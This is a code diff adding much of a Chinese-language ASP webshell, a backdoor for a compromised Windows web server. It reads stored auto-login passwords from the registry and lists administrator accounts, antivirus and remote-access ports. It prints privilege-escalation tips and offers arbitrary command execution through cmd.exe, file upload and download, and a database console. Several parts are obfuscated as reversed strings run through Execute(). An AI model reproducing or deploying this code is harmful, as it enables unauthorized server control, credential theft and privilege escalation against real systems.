+Temp_Str = "<LI>磁盘分区类型：" & Red(TestDrive.FileSystem) & "<LI>磁盘序列号：" & Red(TestDrive.SerialNumber) & "<LI>磁盘共享名：" & Red(TestDrive.ShareName) & "<LI>磁盘总容量：" & Red(CInt(TestDrive.TotalSize/1048576)) & "<LI>磁盘卷名：" & Red(TestDrive.VolumeName) & "<LI>磁盘根目录:" & ScReWr((Drive & ":\"))
+Set BaseFolder = TestDrive.RootFolder
+Set TempFolders = BaseFolder.SubFolders
+For Each D in TempFolders
+Temp_Str = Temp_Str & "<LI>文件夹：" & ScReWr(D)
+Next
+Set TempFolder = Nothing
+Set BaseFolder = Nothing
+Else
+Temp_Str = Temp_Str & "<LI>磁盘根目录:" & Red("不可读:(")
+Dim TempFolderList,t:t=0
+Temp_Str = Temp_Str & "<LI>" & Red("穷举目录测试：")
+TempFolderList = Array("windows","winnt","win","win2000","win98","web","winme","windows2000","asp","php","Tools","Documents and Settings","Program Files","Inetpub","ftp","wmpub","tftp")
+For i = 0 to Ubound(TempFolderList)
+If FSO.FolderExists(Drive & ":\" & TempFolderList(i)) Then
+t = t+1
+Temp_Str = Temp_Str & "<LI>发现文件夹：" & ScReWr(Drive & ":\" & TempFolderList(i))
+End if
+Next
+If t=0 then Temp_Str = Temp_Str & "<LI>已穷举" & Drive & "盘根目录，但未有发现:("
+End if
+Set TestDrive = Nothing
+Set FSO = Nothing
+Temp_Str = Temp_Str & "<LI>注意：" & Red("不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件!")
+Message Drive & ":磁盘信息",Temp_Str,1
+End if
+End Sub
+
+Sub ScFolder(folder) 
+On Error Resume Next
+Dim FSO,OFolder,TempFolder,Scmsg,S
+Set FSO = Server.Createobject("Scripting.FileSystemObject")
+If FSO.FolderExists(folder) Then
+Set OFolder = FSO.GetFolder(folder)
+Set TempFolders = OFolder.SubFolders
+Scmsg = "<LI>指定文件夹根目录：" & ScReWr(folder)
+For Each S in TempFolders
+Scmsg = Scmsg&"<LI>文件夹：" & ScReWr(S)  
+Next
+Set TempFolders = Nothing
+Set OFolder = Nothing
+Else
+Scmsg = Scmsg & "<LI>文件夹：" & Red(folder & "不存在或无读权限!")
+End if
+Scmsg = Scmsg & "<LI>注意：" & Red("不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件!")
+Set FSO = Nothing
+	Message "文件夹信息",Scmsg,1
+End Sub
+
+Function ScReWr(folder)   '1.可读,不可写。2.不可读,可写。3.可读,可写。4.不可读,不可写。
+On Error Resume Next
+Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename
+Set FSO = Server.Createobject("Scripting.FileSystemObject")
+Set TestFolder = FSO.GetFolder(folder)
+Set TestFileList = TestFolder.SubFolders
+RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp"
+For Each A in TestFileList
+Next
+If err Then
+err.Clear
+ReWrStr = folder & "<FONT color=#ff2222> 不可读,"
+FSO.CreateTextFile folder & RndFilename,True
+If err Then
+err.Clear
+ReWrStr = ReWrStr & "不可写。</FONT>"
+Else
+ReWrStr = ReWrStr & "可写。</FONT>"
+FSO.DeleteFile folder & RndFilename,True
+End If
+Else
+ReWrStr = folder & "<FONT color=#ff2222> 可读,"
+FSO.CreateTextFile folder & RndFilename,True
+If err Then
+err.Clear
+ReWrStr = ReWrStr & "不可写。</FONT>"
+Else
+ReWrStr = ReWrStr & "可写。</FONT>"
+FSO.DeleteFile folder & RndFilename,True
+End if
+End if
+Set TestFileList = Nothing
+Set TestFolder = Nothing
+Set FSO = Nothing
+ScReWr = ReWrStr
+End Function
+Function Course()
+ShiSan="╋╋╁>elbat/<╁&2is&1Is&0iS&is SrR╋txEn╋fi dne╋╁>rt/<>dt/<>tnof/<╁&HtAP.jBO&╁;psbn&>FF9933#=roloc tnof<]╁&xL&╁:型类动启[>╁╁2╁╁=napsloc ╁╁224BEE#╁╁=rolocgb ╁╁02╁╁=thgieh dt<>rt<╁&eMaNYAlpsiD.jBo&╁;psbn&>╁╁224BEE#╁╁=rolocgb ╁╁02╁╁=thgieh dt<>dt/<╁&emAN.jbo&╁;psbn&>╁╁224BEE#╁╁=rolocgb ╁╁02╁╁=thgieh dt<>rt<╁&2Is=2is╋ESLE╋╁>rt/<>dt/<>tnof/<╁&hTAP.JbO&╁;psbn&>0000FF#=roloc tnof<]╁&xL&╁:型类动启[>╁╁2╁╁=napsloc ╁╁224BEE#╁╁=rolocgb ╁╁02╁╁=thgieh dt<>rt<╁&emaNYalPSID.jBO&╁;psbn&>╁╁224BEE#╁╁=rolocgb ╁╁02╁╁=thgieh dt<>dt/<╁&EMAN.jbo&╁;psbn&>╁╁224BEE#╁╁=rolocgb ╁╁02╁╁=thgieh dt<>rt<╁&1is=1iS╋NeHt 2=epYttraTS.Jbo DnA ╁niw╁><))3,4,htAp.jbo(dim(eSaCL Fi╋╁用禁╁=XL NEht 4=EpYtTratS.jbo FI╋╁动手╁=XL NEHt 3=ePyTTRAtS.jBo FI╋╁动自╁=xl NEht 2=epytTrAtS.jBo Fi╋fi DnE╋ ╁>rt/<>dt/<;psbn&>╁╁2╁╁=napsloc ╁╁224BEE#╁╁=rolocgb ╁╁02╁╁=thgieh dt<>rt<╁=0iS╋╁>rt/<>dt/<╁&iS=is╋╁)组(户用统系╁&IS=is╋ ╁;psbn&>╁╁224BEE#╁╁=rolocgb dt<>dt/<╁&Is=Is╋EMan.jbO&is=is╋╁;psbn&>╁╁224BEE#╁╁=rolocgb ╁╁02╁╁=thgieh dt<╁&IS=iS╋╁>rt<╁&IS=Is╋NeHT ╁╁=epYTtrATS.JbO fI╋RAElc.rrE╋)╁.//:TNniW╁(tCeJBoTeg ni Jbo hCAe roF╋TXEN emUSer RoRre no╋╁>rt/<>dt/<务服与户用统系>'unem'=rolocgb 'retnec'=ngila '3'=napsloc '02'=thgieh dt<>rt<╁&iS=IS╋╁>'retnec'=ngila '0'=gniddapllec '1'=gnicapsllec '0'=redrob 'unem'=rolocgb '006'=htdiw elbat<>rb<╁=is"
+ExeCuTe(ShiSanFun(ShiSan))
+ENd Function
+Function ServerInfo()
+ShiSan="╋╋IS sRR╋tXEN╋╁>rt/<>dt/<╁&)2,i(Tbo&╁>tfel=ngila '224BEE#'=rolocgb dt<>dt/<╁&)1,i(TBo&╁>'224BEE#'=rolocgb dt<>dt/<╁&)0,I(tBo&╁>'224BEE#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<╁&IS=IS╋31 OT 0=i ROf╋╁>rt/<>dt/<╁&)╁ERAWTFOS_REVRES╁(selBaIrAvrEvREs.TseuQeR&╁>'224BEE#'=rolocgb dt<>dt/<;psbn&>'224BEE#'=rolocgb dt<>dt/<本版器务服BEW>'224BEE#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<╁&IS=iS╋╁>rt/<>dt/<╁&)╁SO╁(SelBaIRAvrevREs.tsEuqER&╁>'224BEE#'=rolocgb dt<>dt/<;psbn&>'224BEE#'=rolocgb dt<>dt/<统系作操器务服>'224BEE#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<╁&is=iS╋╁>rt/<>dt/<╁&)╁SROSSECORP_FO_REBMUN╁(selBAIRaVReVREs.tSEUqER&╁>'224BEE#'=rolocgb dt<>dt/<;psbn&>'224BEE#'=rolocgb dt<>dt/<量数UPC器务服>'224BEE#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<╁&is=Is╋╁>rt/<>dt/<;psbn&╁&WON&╁>'224BEE#'=rolocgb dt<>dt/<;psbn&>'224BEE#'=rolocgb dt<>dt/<间时器务服>'224BEE#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<╁&Is=IS╋╁>mrof/<>rt/<>dt/<>'2'=eulav 'noitca'=eman 'neddih'=epyt tupni<>'xp0:redrob'=elyts'询查'=eulav 'timbus'=epyt tupni<>'xp0:redrob'=elyts'╁&)╁RDDA_LACOL╁(selbairaVrevreS.tseuqEr&╁'=eulav '51'=ezis 'pi'=eman 'txet'=epyt tupni<╁&iS=iS╋╁>'224BEE#'=rolocgb dt<>dt/<;psbn&>'224BEE#'=rolocgb dt<>dt/<PI器务服>'224BEE#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<>'knalb_'=tegrat 'mrofpi'=eman 'psa.spi/moc.831pi.www//:ptth'=noitca tsop=dohtem mrof<╁&Is=IS╋╁>rt/<>dt/<╁&)╁EMAN_REVRES╁(SelbAiRavrevreS.TsEUqEr&╁>'224BEE#'=rolocgb dt<>dt/<;psbn&>'224BEE#'=rolocgb dt<>dt/<名器务服>'224BEE#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<╁&IS=iS╋╁>rt/<>dt/<息信件组器务服>'unem'=rolocgb 'retnec'=ngila '3'=napsloc '02'=thgieh dt<>rt<╁&iS=Is╋╁>'retnec'=ngila '0'=gniddapllec '1'=gnicapsllec '0'=redrob 'unem'=rolocgb '%08'=htdiw elbat<>rb<╁=is"
+ExeCuTe(ShiSanFun(ShiSan))
+End Function
+fuNcTion DownFILE(PAth)
+RespoNse.cleAr
+sEt Osm = creATEOBJeCT(OBT(6,0))
+oSM.oPEN
+oSM.tYPe = 1
+osm.lOAdfromFILe PatH
+Sz=inSTRrEv(PAth,"\")+1
+ReSPoNse.AddHEaDer "Content-Disposition", "attachment; filename=" & mid(pAth,SZ)
+RESPOnSe.AdDHeAder "Content-Length", Osm.SIzE
+ResPOnsE.ChARSET = "UTF-8"
+ReSPOnSe.CONTENTTYpE = "application/octet-stream"
+RESPONSE.binArywRiTE oSm.Read
+rEsponSE.flUSh
+osM.cLoSe
+SeT OsM = nOThINg
+eNd FUnction
+fUnCtIOn htMLeNcODe(s)
+if NoT iSnull(s) THen
+S = ReplACE(S, ">", "&gt;")
+S = rePlaCE(s, "<", "&lt;")
+S = rEplAce(S, CHR(39), "&#39;")
+S = RepLAcE(S, chR(34), "&quot;")
+S = REPLACE(s, chr(20), "&nbsp;")
+hTmLencoDE = S
+End iF
+End Function
+Function AdminUser()
+ShiSan="╋╋fi dne╋╁krowteN.tpircsW:啊行不的奶奶他╁ etirw.esnopseR╋neht rre fi╋txeN╋╁>rb<╁&emaN.nimda etirw.esnopseR╋srebmeM.puorGjbo ni nimda hcaE roF╋)╁puorg,srotartsinimdA/╁&emaNretupmoC.Nt&╁//:TNniW╁(tcejbOteG=puorGjbo teS╋)╁krowteN.tpircsW╁(tcejbOetaerc.revres=Nt teS╋号帐组srotartsinimdA找查' txen emuser rorre no╋0=seripxE.esnopseR"
+ExeCuTe(ShiSanFun(ShiSan))
+End Function
+Sub GetTerminalInfo()
+on error resume next
+dim wsh
+set wsh=createobject("Wscript.Shell")
+Response.Write "[网络探测]<br><hr size=1>"
+EnableTCPIPKey="HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters"
+isEnable=Wsh.Regread(EnableTcpipKey)
+If isEnable=0 or isEnable="" Then
+Notcpipfilter=1
+End If
+ApdKey="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind"
+Apds=Wsh.RegRead(ApdKey)
+If IsArray(Apds) Then 
+For i=LBound(Apds) To UBound(Apds)-1
+ApdB=Replace(Apds(i),"\Device\","")
+Response.Write "网卡"&i&"的序列为:"&ApdB&"<br>"
+Path="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\"
+IPKey=Path&ApdB&"\IPAddress"
+IPaddr=Wsh.Regread(IPKey)
+If IPaddr(0)<>"" Then
+For j=Lbound(IPAddr) to Ubound(IPAddr)
+Response.Write "<li>IP地址"&j&"为:"&IPAddr(j)&"<br>"
+Next
+Else
+Response.Write "<li>IP地址无法读取或没有设置<br>"
+End if
+GateWayKey=Path&ApdB&"\DefaultGateway"
+GateWay=Wsh.Regread(GateWayKey)
+If isarray(GateWay) Then
+For j=Lbound(Gateway) to Ubound(Gateway)
+Response.Write "<li>网关"&j&"为:"&Gateway(j)&"<br>"
+Next
+Else
+Response.Write "<li>默认网关无法读取或没有设置<br>"
+End if
+DNSKey=Path&ApdB&"\NameServer"
+DNSstr=Wsh.RegRead(DNSKey)
+If DNSstr<>"" Then
+Response.Write "<li>网卡DNS为:"&DNSstr&"<br>"
+Else
+Response.Write "<li>默认DNS无法读取或没有设置<br>"
+End If
+if Notcpipfilter=1 Then 
+Response.Write "<li>没有Tcp/IP筛选<br>"
+else
+ETK="\TCPAllowedPorts"
+EUK="\UDPAllowedPorts"
+FullTCP=Path&ApdB&ETK
+FullUDP=path&ApdB&EUK
+tcpallow=Wsh.RegRead(FullTCP)
+If tcpallow(0)="" or tcpallow(0)=0 Then
+Response.Write "<li>允许的TCP端口为:全部<br>"
+Else
+Response.Write "<li>允许的TCP端口为:"
+For j = LBound(tcpallow) To UBound(tcpallow)
+Response.Write tcpallow(j)&","
+Next
+Response.Write "<Br>"
+End if
+udpallow=Wsh.RegRead(FullUDP)
+If udpallow(0)="" or udpallow(0)=0 Then
+Response.Write "<li>允许的UDP端口为:全部<br>"
+Else
+Response.Write "<li>允许的UDP端口为:"
+for j = LBound(udpallow) To UBound(udpallow)
+Response.Write UDPallow(j)&","
+next
+Response.Write "<br>"
+End if
+End if
+Response.Write "------------------------------------------------<br>"
+Next
+end if
+Response.Write "<br><br>[特殊端口探测]<br><hr size=1>"
+Telnetkey="HKEY_LOCAL_MACHINE\SOFTWARE\ Microsoft\TelnetServer\1.0\TelnetPort"
+TlntPort=Wsh.RegRead(TelnetKey)
+if TlntPort="" Then Tlnt="23(默认设置)"
+Response.Write "<li>Telnet端口:"&Tlntport&"<br>"
+TermKey="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber"
+TermPort=Wsh.RegRead(TermKey)
+If TermPort="" Then TermPort="无法读取.请确认是否为Windows Server版本主机"
+Response.Write "<li>Terminal Service端口为:"&TermPort&"<br>"
+pcAnywhereKey="HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"
+PAWPort=Wsh.RegRead(pcAnywhereKey)
+If PAWPort="" then PAWPort="无法获取.请确认主机是否安装pcAnywhere"
+Response.Write "<li>PcAnywhere端口为:"&PAWPort&"<br>"
+Response.Write "------------------------------------------------------"
+Set wsX = Server.CreateObject("WScript.Shell")
+Dim terminalPortPath, terminalPortKey, termPort
+Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
+Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword
+terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
+terminalPortKey = "PortNumber"
+termPort = wsX.RegRead(terminalPortPath & terminalPortKey)
+RrS"终端服务端口及自动登录<ol>"
+If termPort = "" Or Err.Number <> 0 Then 
+RRS"无法得到终端服务端口, 请检查权限是否已经受到限制.<br/>"
+ Else
+RrS"当前终端服务端口: " & termPort & "<br/>"
+End If
+autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
+autoLoginEnableKey = "AutoAdminLogon"
+autoLoginUserKey = "DefaultUserName"
+autoLoginPassKey = "DefaultPassword"
+isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)
+If isAutoLoginEnable = 0 Then
+RrS"系统自动登录功能未开启<br/>"
+Else
+autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)
+RrS"自动登录的系统帐户: " & autoLoginUsername & "<br>"
+autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)
+If Err Then
+Err.Clear
+RrS"False"
+End If
+RrS"自动登录的帐户密码: " & autoLoginPassword & "<br>"
+End If
+RrS"</ol>"
+Response.Write "<br><br><br>[系统软件探测]<br><hr size=1>"
+SoftPath=Wsh.Environment.item("Path")
+Pathinfo=lcase(SoftPath)
+Response.Write "系统软件支持:"
+if Instr(Pathinfo,"perl") Then Response.Write "<li>Perl脚本:支持<br>"
+if instr(Pathinfo,"java") Then Response.Write "<li>Java脚本:支持<br>"
+if instr(Pathinfo,"microsoft sql server") Then Response.Write "<li>MSSQL数据库服务:支持<br>"
+if instr(Pathinfo,"mysql") Then Response.Write "<li>MySQL数据库服务:支持<br>"
+if instr(Pathinfo,"oracle") Then Response.Write "<li>Oracle数据库服务:支持<br>"
+if instr(Pathinfo,"cfusionmx7") Then Response.Write "<li>CFM服务器:支持<br>"
+if instr(Pathinfo,"pcanywhere") Then Response.Write "<li>赛门铁克PcAnywhere控制:支持<br>"
+if instr(Pathinfo,"Kill") Then Response.Write "<li>Kill杀毒软件:支持<br>"
+if instr(Pathinfo,"kav") Then Response.Write "<li> 金山系列杀毒软件:支持<br>"
+if instr(Pathinfo,"antivirus") Then Response.Write "<li>赛门铁克杀毒软件:支持<br>"
+if instr(Pathinfo,"rising") Then Response.Write "<li>瑞星系列杀毒软件:支持<br>"
+paths=split(SoftPath,";")
+Response.Write "------------------------------------<br>"
+Response.Write "系统当前路径变量:<br>"
+For i=Lbound(paths) to Ubound(paths)
+Response.Write "<li>"&paths(i)&"<br>"
+next
+Response.Write "<br><br>[系统设置探测]<br><hr size=1>"
+pcnamekey="HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName"
+pcname=wsh.RegRead(pcnamekey)
+if pcname="" Then pcname="无法读取主机名.<br>"
+Response.Write "<li>当前主机名为:"&pcname&"<br>"
+AdminNameKey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AltDefaultUserName"
+AdminName=wsh.RegRead(AdminNameKey)
+if adminname="" Then AdminName="Administrator"
+Response.Write "<li>默认管理员用户名为:"&AdminName&"<br>"
+isAutologin="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoAdminLogon"
+Autologin=Wsh.RegRead(isAutologin)
+if Autologin=0 or Autologin="" Then
+Response.Write "<li>用户自动登入:未启用<br>"
+Else
+Response.Write "<li>用户自动登入:启用<br>"
+Admin=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultUserName")
+Passwd=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword")
+Response.Write "<li type=square>用户名:"&Admin&"<br>"
+Response.Write "<li type=square>密码:"&Passwd&"<br>"
+End if
+displogin=wsh.regRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DontDisplayLastUserName")
+If displogin="" or displogin=0 Then disply="是" else disply="否"
+Response.Write "<li>是否显示上次登入用户:"&disply&"<br>"
+NTMLkey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0\NTML"
+ntml=Wsh.RegRead(NTMLkey)
+if ntml="" Then Ntml=1
+Response.Write "<li>Telnet Ntml设置为:"&ntml&"<br>"
+hk="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count"
+kk=wsh.RegRead(hk)
+Response.Write"<li>当前活动网卡为:"&kk&"<br>"
+Response.Write "------------------------------------<br><br><br>"
+Response.write "[服务器弱点探测]<br><hr>"
+Set objComputer = GetObject("WinNT://.")
+Set sa = Server.CreateObject("Shell.Application")
+objComputer.Filter = Array("Service")
+On Error Resume Next
+For Each objService In objComputer
+if objService.Name="Serv-U" Then
+if objService.ServiceAccountName="LocalSystem" Then
+Response.Write "<li>服务器中有Serv-U安装,且以LocalSystem权限启动,可以考虑提权<br>"
+End if
+End if
+if lcase(objService.Name)="apache" Then
+if objService.ServiceAccountName="LocalSystem" Then
+If instr(Request.ServerVariables("SERVER_SOFTWARE"),"Apache") Then
+Response.Write "<li>当前WEB服务器为Apache.可以直接提权<br>"
+Else
+Response.Write " <li>服务器中有Apache服务存在,启动权限为LocalSystem,可以考虑PHP木马<br>"
+End if
+end if
+End if
+if instr(lcase(objService.Name),"tomcat") Then
+if objService.ServiceAccountName="LocalSystem" Then
+Response.Write "<li>服务器中有Tomcat,且以LocalSystem权限启动,可以考虑使用Jsp木马提权<br>"
+End if
+End if
+if instr(lcase(objService.Name),"winmail") Then
+if objService.ServiceAccountName="LocalSystem" Then
+Response.Write "<li>服务器中有Magic Winmail,且以LocalSystem权限启动,可以查找WebMail目录,并且写入PHP木马<br>"
+End if
+End if
+Next
+Set fso=Server.Createobject("Scripting.FileSystemObject")
+Sysdrive=left(Fso.GetspecialFolder(2),2)
+servername=wsh.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName")
+If fso.FileExists(sysdriver&"\Documents And Settings\All Users\Application Data\Symantec\"&servername&".cif") Then
+Response.Write "<li>发现pcAnywhere密码文件,可以从默认目录下载并破解得到pcAnywhere密码"
+End if
+End Sub
+
+
+Function UpFile()
+  If Request("Action2")="Post" Then
+    Set U=new UPC : Set F=U.UA("LocalFile")
+	UName=U.form("ToPath")
+    If UName="" Or F.FileSize=0 then
+      SI="<br>请输入上传的完全路径后选择一个文件上传!"
+    Else
+        F.SaveAs UName
+        If Err.number=0 Then
+          SI="<center><br><br><br>文件"&UName&"上传成功！</center>"
+		End if
+	End If
+	Set F=nothing:Set U=nothing
+	SI=SI&BackUrl
+	RRS SI
+	ShowErr()
+	Response.End
+  End If
+    SI="<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>"
+    SI=SI&"<form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>"
+    SI=SI&"<tr><td>"
+    SI=SI&"上传路径：<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\Cmd.exe")&"' size='40'>"
+    SI=SI&" <input name='LocalFile' type='file'  size='25'>"
+    SI=SI&" <input type='submit' name='Submit' value='上传'>"
+    SI=SI&"</td></tr></form></table>"
+  RRS SI
+End Function
+
+Function Cmd1Shell()
+ShiSan="╋╋is srr╋╁>mrof/<>aeratxet/<╁&)31(rhC&Is=Is╋fI dNe╋Fi dne╋aAa&is=is╋)EUrT ,ELIfPmETzS(elifEteleD.OsF llAc╋eSOLc.XCLElIfo╋)LLaDAeR.xClelIfo(EDoCNelMTH.rEVRes=AAA╋)0 ,eSLAF ,1 ,ElIFpmEtzS( eLIFTxetNEpO.sF = xcLeLiFo Tes╋)╁tcejbOmetsySeliF.gnitpircS╁(TcEJbOEtaerc = sf TES╋)EURT ,0 ,eliFPmETZs & ╁ > ╁ & DMCFED & ╁ c/ ╁&HtAPLlehS( NUr.sW lLAc╋)╁txt.dmc╁(HTapPaM.REVRES = eLiFPmetZs╋)╁tcejbOmetsySeliF.gnitpircS╁(tcEJBOeTAERc.rEvrES=OSF tes╋)╁llehS.tpircSW╁(tcEjBOETAerC.rEvrEs=SW TES╋)╁llehS.tpircSW╁(tCEjboeTaerC.revres=sW Tes╋TxeN eMusER ROrrE no╋ESLe╋aaA&Is=IS╋lLaDAeR.TUoDtS.dD=aAA╋)dmcFEd&╁ c/ ╁&hTaPllehs(CExE.Mc=Dd tES╋))0,1(tbo(TcejBoetaerC=Mc tES╋NeHT ╁sey╁=)╁tpircsw╁(MrOF.tSEUqEr fi╋nEht ╁╁><)╁dmc╁(MRof.tSeUqer FI╋╁>'dmc'=ssalc ';044:thgieh;%001:htdiw'=elytS aeratxet<>'行执'=eulav 'timbus'=epyt tupni< >'╁&DMCfEd&╁'=eulav '%29:htdiw'=elytS 'dmc'=eman tupni<╁&Is=iS╋╁llehS.tpircSW>╁&DEKCEHC&╁'sey'=eulav 'tpircsw'=eman 'xobkcehc'=epyt c=ssalc tupni<╁&IS=IS╋╁;psbn&;psbn&>'%07:htdiw'=elytS '╁&HTAPllEhS&╁'=eulav 'PS'=eman tupni<：径路LLEHS╁&iS=is╋╁>'tsop'=dohtem mrof<╁=IS╋)╁dmc╁(tSeuQEr = DMcFED nEht ╁╁><)╁dmc╁(tSeuqER FI╋╁╁=DEKceHc nEht ╁sey╁><)╁tpircsw╁(TSeUqER FI╋╁exe.dmc╁ = htAPlLEHs neHT ╁╁=htapllEhs fI╋)╁htaPllehS╁(nOISses=HtApLLehS╋)╁PS╁(TsEuQEr = )╁htaPllehS╁(NOIsSeS nEHt ╁╁><)╁PS╁(TSeUQEr FI╋╁dekcehc ╁=DekCehC"
+ExeCuTe(ShiSanFun(ShiSan))
+
+END FuncTioN
+fUNction CrEatemDB(paTH) 
+   sI="<br><br>"
+   SeT c = cREAtEoBjeCt(OBT(2,0)) 
+   C.cReATe("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & paTH)
+   set C = NothiNG
+   IF eRR.nUmbEr=0 tHEN
+     SI = SI & Path & "建立成功!"
+   EnD IF
+   Si=si&BAcKurl 
+   RrS Si
+End Function 
+
+Function CompactMdb(Path)
+If Not ObT(0,1) Then
+    Set C=CreateObject(ObT(3,0)) 
+      C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path
+	Set C=Nothing
+Else
+  Set FSO=CreateObject(ObT(0,1))
+  If FSO.FileExists(Path) Then
+    Set C=CreateObject(ObT(3,0)) 
+      C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path&"_bak"
+	Set C=Nothing
+    FSO.DeleteFile Path
+	FSO.MoveFile Path&"_bak",Path
+  Else
+    SI="<center><br><br><br>数据库"&Path&"没有发现！</center>" 
+	Err.number=1
+  End If
+  Set FSO=Nothing
+End If
+  If Err.number=0 Then
+    SI="<center><br><br><br>数据库"&Path&"压缩成功！</center>"
+  End If
+  SI=SI&BackUrl
+  RRS SI
+End Function
+hu="琳FI dnE琳DNe.ESnOPsER琳FI DnE琳IS sRr neHt 0><)cIS,IS(rtsNi fI琳"">retnec/<>vid/<""&SreS&"">rb<>rh<>elbat/<>rt/<>dt/<>rh<>'nigoL'=eulav 'timbus'=epyt tupni< >'22'=ezis 'drowssap'=epyt 'ssap'=eman tupni<>tnof/<>'tsop'=dohtem '""&lrU&""'=noitca mrof<>rh<>a/<""&emaNllehS&"">'knalb_'=tegrat '""&lRuETIS&""'=ferh a<>rb<>';xp001:nigram;xp22:gniddap;222# dilos xp1:redrob;xp005:htdiw'=elyts vid<>retnec<""=is琳eSlE琳fI dnE琳"">p/<>b/<>tnof/<>b/<moc.yiDoA.www>b<>p/<气空 :yb>'emil'=roloc '6'=ezis tnof<>retnec=ngila vid<>b<>rb<>rb<>rb<>rb< >b/<>tnof/<!!!骑乱要不就儿马的己自是不,样小>'der'=roloc '7'=ezis tnof<>retnec=ngila vid<>b<>p/<;psbn&>p<>p/<;psbn&>p<>p/<;psbn&>p<>p/<;psbn&>p<>p/<;psbn&>p<""SRR琳esLE琳lrU tcEridEr.EsnOPSEr琳ssAPRESu=)""nimd2a2bew""(NoISsES琳nehT SSAPRESu=)""ssap""(MRof.TseuqER Fi琳NehT """"><)""ssap""(MRoF.tSeuqer FI琳nEht sSapREsU><)""nimd2a2bew""(NoIssES FI琳"
+execute(UnEncode(hu))
+function UnEncode(cc)
+for i = 1 to len(cc)
+    if mid(cc,i,1)<> "琳" then
+temp = Mid(cc, i, 1) + temp
+   else
+    temp=vbcrlf&temp
+ end if
+next
+UnEncode=temp
+end function
+Function DBmaNaGer()
+  sqlstr=tRIm(REQueST.fOrm("SqlStr"))
+  dbStr=REquesT.FORM("DbStr")
+  si=Si&"<table width='650'  border='0' cellspacing='0' cellpadding='0'>"
+  sI=SI&"<form name='DbForm' method='post' action=''>"
+  sI=SI&"<tr><td width='100' height='27'> &nbsp;数据库连接串:</td>"
+  Si=si&"<td><input name='DbStr' style='width:470' value="""&dbSTr&"""></td>"
+  si=si&"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>连接串示例</option><option value=0>Access连接</option>"
+  sI=SI&"<option value=1>MsSql连接</option><option value=2>MySql连接</option><option value=3>DSN连接</option>"
+  Si=si&"<option value=-1>--SQL语法--</option><option value=4>显示数据</option><option value=5>添加数据</option>"
+  SI=Si&"<option value=6>删除数据</option><option value=7>修改数据</option><option value=8>建数据表</option>"
+  SI=SI&"<option value=9>删数据表</option><option value=10>添加字段</option><option value=11>删除字段</option>"
+  sI=si&"<option value=12>完全显示</option></select></td></tr>"
+  Si=Si&"<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>"
+  sI=si&"<tr><td height='30'>&nbsp;SQL操作命令:</td>"
+  Si=SI&"<td><input name='SqlStr' style='width:470' value="""&sQlsTr&"""></td>"
+  sI=sI&"<td align='center'><input type='submit' name='Submit' value='执行' onclick='return DbCheck()'></td>"
+  SI=SI&"</tr></form></table><span id='abc'></span>"
+  RRS sI:SI=""
+  IF LeN(DBstR)>40 thEN
+  set cONn=CREatEObjEct(OBT(5,0))
+  Conn.OPEN DBsTr
+  SEt Rs=CoNn.OPENschEmA(20) 
+  si=Si&"<table><tr height='25' Bgcolor='#CCCCCC'><td>表<br>名</td>"
+  Rs.MovEfirst 
+  DO whIlE not RS.EOF
+    IF Rs("TABLE_TYPE")="TABLE" tHEN
+	  tNAMe=rS("TABLE_NAME")
+      SI=sI&"<td align=center><a href=""javascript:if(confirm('确定删除么？'))FullSqlStr('DROP TABLE ["&tnAMe&"]',1)"">[ del ]</a><br>"
